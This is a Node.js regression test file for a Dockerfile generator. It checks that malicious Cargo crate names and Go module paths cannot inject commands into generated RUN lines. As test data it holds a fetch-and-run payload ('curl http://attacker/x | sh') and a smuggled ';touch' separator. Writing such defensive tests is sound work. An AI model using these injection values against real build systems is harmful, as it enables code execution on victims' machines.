'use strict';

// Security regression: project-controlled names (Cargo crate name, Go module path / cmd dir)
// must never reach a shell-form RUN unsanitized. A malicious manifest must not be able to make
// the generated Dockerfile execute arbitrary commands at `docker build` time.
//
// Run host-side: `node --test test/injection.test.js` from packages/core.

const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const core = require('../src/index.js');

function tmpProject(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'df-inj-'));
  for (const [rel, content] of Object.entries(files)) {
    const abs = path.join(dir, rel);
    fs.mkdirSync(path.dirname(abs), { recursive: true });
    fs.writeFileSync(abs, content);
  }
  return dir;
}

const PAYLOAD = 'curl http://attacker/x | sh';

test('Rust: a malicious crate name cannot inject into the build RUN', async () => {
  const dir = tmpProject({
    'Cargo.toml': `[package]\nname = "app && ${PAYLOAD}"\nversion = "0.1.0"\nedition = "2021"\n`,
    'Cargo.lock': 'version = 3\n',
    'src/main.rs': 'fn main(){}\n',
  });
  const projectPath = await core.ingestLocal(dir);
  const { dockerfile } = await core.runDockerfileEngine({ projectPath });

  assert.ok(!dockerfile.includes(PAYLOAD), 'payload must not appear anywhere in the Dockerfile');
  assert.ok(!dockerfile.includes('&&  '), 'no smuggled && from the crate name');
  assert.ok(/--bin app\b/.test(dockerfile), 'falls back to the safe "app" binary name');
});

test('Go: a malicious module path cannot inject into the build RUN', async () => {
  const dir = tmpProject({
    'go.mod': 'module evil;touch /tmp/PWNED\n\ngo 1.23\n',
    'go.sum': '',
    'main.go': 'package main\nfunc main(){}\n',
  });
  const projectPath = await core.ingestLocal(dir);
  const { dockerfile } = await core.runDockerfileEngine({ projectPath });

  assert.ok(!dockerfile.includes(';touch'), 'no smuggled shell separator from the module path');
  assert.ok(/-o \/out\/app /.test(dockerfile), 'falls back to the safe "app" binary name');
  assert.ok(/ENTRYPOINT \["\/usr\/local\/bin\/app"\]/.test(dockerfile), 'entrypoint is the safe binary');
});
